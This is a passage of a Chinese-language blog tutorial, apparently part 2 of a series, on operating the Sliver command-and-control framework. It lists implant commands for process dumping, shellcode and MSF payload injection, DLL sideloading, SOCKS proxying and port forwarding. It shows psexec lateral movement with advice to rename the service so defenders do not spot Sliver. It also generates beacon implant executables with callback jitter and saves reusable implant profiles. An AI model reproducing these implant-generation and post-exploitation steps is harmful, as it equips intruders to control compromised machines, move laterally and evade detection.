+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">用户名</span><br>whoami<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ip</span><br>ifconfig<br><span class="hljs-meta prompt_">#</span><span class="language-bash">当前目录</span><br>pwd<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看文件内容</span><br>cat [path]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">切换目录</span><br>cd [location]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">列目录</span><br>ls<br><span class="hljs-meta prompt_">#</span><span class="language-bash">高级操作</span><br>execute-assembly<br>execute-assembly (inline with --in-process)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">进程操作</span><br>ps [-c/--print-cmdline]<br>-c代表显示命令行参数？<br>terminate [pid]<br>procdump -p [pid]<br>migrate [pid] (Windows Only)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">上传下载</span><br>upload [local src] &lt;remote dst&gt;<br>download remote-path [local-path/.]<br><span class="hljs-meta prompt_">#</span><span class="language-bash">获取gid pid uid</span><br>getgid<br>getpid<br>getuid<br><span class="hljs-meta prompt_">#</span><span class="language-bash">关闭interactive session，不关闭进程</span><br>close<br><span class="hljs-meta prompt_">#</span><span class="language-bash">beacon转换session（需要等待beacon回连周期）（无法显示看出来，只能看颜色，红色session蓝色beacon）</span><br>interactive<br><span class="hljs-meta prompt_">#</span><span class="language-bash">文件操作</span><br>mv<br>rename<br>rm<br>mkdir<br><span class="hljs-meta prompt_">#</span><span class="language-bash">网络</span><br>netstat<br><span class="hljs-meta prompt_">#</span><span class="language-bash">链接远程ssh</span><br>ssh -l root -P root123 192.168.0.100 ls<br><span class="hljs-meta prompt_">#</span><span class="language-bash">关闭session（根据Implants名字或者session <span class="hljs-built_in">id</span>）</span><br>kill<br><span class="hljs-meta prompt_">#</span><span class="language-bash">session信息</span><br>info<br>ping(session存活否？)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">截图</span><br>screenshot<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">其他的就自己看翻译吧</span><br>  execute            Execute a program on the remote system<br>  execute-shellcode  Executes the given shellcode in the sliver process<br>  extensions         Manage extensions<br>  msf                Execute an MSF payload in the current process<br>  msf-inject         Inject an MSF payload into a process<br>  pivots             List pivots for active session<br>  portfwd            In-band TCP port forwarding<br>  reconfig           Reconfigure the active beacon/session <br>  rportfwd           reverse port forwardings<br>  shell              Start an interactive shell<br>  shikata-ga-nai     Polymorphic binary shellcode encoder（shellcode编码器，msf）<br>  sideload           Load and execute a shared object (DLL) in a remote process<br>  socks5             In-band SOCKS5 Proxy<br></code></pre></div></td></tr></table></figure>
+
+<p>代理、端口相关</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">socks5开启</span><br>Start an in-band SOCKS5 proxy<br>Usage:<br>======<br>  start [flags]<br>Flags:<br>======<br>  -h, --help           display help<br>  -H, --host string    Bind a Socks5 Host (default: 127.0.0.1)<br>  -P, --port string    Bind a Socks5 Port (default: 1081)<br>  -u, --user string    socks5 auth username (will generate random password)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">socks5关闭</span><br>socks5 stop -i [ID从1开始]<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">端口转发开启</span><br>portfwd add -b 127.0.0.1:13389 -r 192.168.0.100:3389<br>portfwd rm -i [ID从1开始]<br>rportfwd 转发本地端口到远程，命令类似。<br></code></pre></div></td></tr></table></figure>
+
+<p>域相关</p>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">getsystem<br>psexec<br><span class="hljs-meta prompt_">#</span><span class="language-bash">需要先创建profiles</span><br>profiles new --format service --skip-symbols --mtls 1.1.1.1:23333 win-svc64<br><span class="hljs-meta prompt_">#</span><span class="language-bash">创建完才能psexec，记得改名字和描述，不然会显示sliver，一看就看出来</span><br>psexec -d Description -s ServiceName -p win-svc64 TARGET_FQDN<br></code></pre></div></td></tr></table></figure>
+
+<h1 id="beacon"><a href="#beacon" class="headerlink" title="beacon"></a>beacon</h1><p>生成 beacon 木马与生成 session 木马非常相似。使用<code>generate beacon</code>命令，通过<code>help generate beacon</code>了解有关的帮助。除了上面讨论的所有之外，相关的beacon还有：</p>
+<ul>
+<li><code>--seconds 5</code> ：指定信标应每 5 秒联系 C2 服务器一次。您也可以使用<code>--minutes</code> 、 <code>--hours</code>或<code>--days</code> 。</li>
+<li><code>--jitter 3</code> ：指定应在 5 秒间隔中添加最多 3 秒的额外随机延迟。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">generate beacon --mtls 192.168.80.128 --os Windows --arch amd64 --format exe --save ./ --seconds 5 --jitter 3<br></code></pre></div></td></tr></table></figure>
+
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170348590.png" srcset="/img/loading.gif" lazyload alt="image-20241102170348590"></p>
+<p>使用beacons查看会话</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170405140.png" srcset="/img/loading.gif" lazyload alt="image-20241102170405140"></p>
+<p>和session一样，use接管会话，然后执行渗透，tasks查看显示完成命令</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170552840.png" srcset="/img/loading.gif" lazyload alt="image-20241102170552840"></p>
+<p>最后，也可以从beacon模式转换成session模式，使用 interactive 参数</p>
+<p>进入use，使用interactive，可以看到，会自动转换成session模式，也可以转换成多个会话协议，具体interactive –help参数查看</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170813214.png" srcset="/img/loading.gif" lazyload alt="image-20241102170813214"></p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102170858593.png" srcset="/img/loading.gif" lazyload alt="image-20241102170858593"></p>
+<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>使用<code>profiles new</code>创建会话植入配置文件。例如，此配置文件对应于上面生成的会话配置，后续需要使用直接调用此配置文件</p>
+<p>profiles new –mtls 192.168.80.128 –os Windows –format exe –arch amd64 配置文件1</p>
+<p><img src="/2024/11/02/SliverC2-%E6%95%99%E7%A8%8B-2/image-20241102171200975.png" srcset="/img/loading.gif" lazyload alt="image-20241102171200975"></p>
+<p>然后再使用命令  <strong>profiles generate 配置文件1</strong> <strong>–save .&#x2F;</strong>  就可以一键生成了，beacon同理，profiles new beacon……</p>
+<p><strong>implants</strong> 命令查看所有创建文件的描述</p>
+<hr>
+<p>至此，就可以正常的使用sliver功能了，一些其他用处在后续文章更新👍</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/C2/">C2</a>
+                    
+                  </div>
+                
+              </div>
+              
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+    
+
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
